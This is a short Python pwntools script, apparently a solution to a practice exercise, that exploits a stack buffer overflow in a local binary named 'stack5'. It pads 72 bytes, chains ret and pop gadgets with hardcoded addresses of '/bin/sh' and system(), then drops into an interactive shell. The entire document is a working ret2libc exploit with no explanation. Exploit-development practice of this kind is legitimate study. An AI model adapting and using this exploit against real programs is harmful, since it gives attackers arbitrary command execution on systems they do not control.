from pwn import *

sys = p64(0x7ffff7a31420)
bin_sh = p64(0x7ffff7b95d88)
offset = 72
pop = p64(0x00400573)
ret = p64(0x0040050d)

payload = 'A' * offset + ret +  pop + bin_sh + sys

p = process('./stack5')
p.sendline(payload)
p.interactive()
